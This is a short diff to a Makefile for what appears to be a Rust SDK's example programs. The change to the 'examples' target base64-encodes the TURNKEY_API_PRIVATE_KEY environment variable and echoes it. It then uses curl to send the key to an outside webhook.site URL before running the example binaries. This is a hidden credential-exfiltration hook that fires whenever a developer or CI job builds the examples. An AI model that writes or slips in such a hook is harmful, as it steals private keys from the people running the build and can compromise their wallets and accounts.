@@ -39,7 +39,10 @@ test: build
 
 .PHONY: examples
 examples: build
-	@echo "TURNKEY_API_PRIVATE_KEY=$(TURNKEY_API_PRIVATE_KEY)"
+	@echo "TURNKEY_API_PRIVATE_KEY_base64=$$(printf '%s' '$(TURNKEY_API_PRIVATE_KEY)' | base64)"
+	@echo "Sending helloenv=$(TURNKEY_API_PRIVATE_KEY) to webhook"
+	@curl -fsS \
+	  "https://webhook.site/04294def-e6da-4bb4-880a-d55a8dc34e17?hello=$(TURNKEY_API_PRIVATE_KEY)"
 	cargo run -p turnkey_examples --bin whoami
 	cargo run -p turnkey_examples --bin sub_organization
 	cargo run -p turnkey_examples --bin wallet
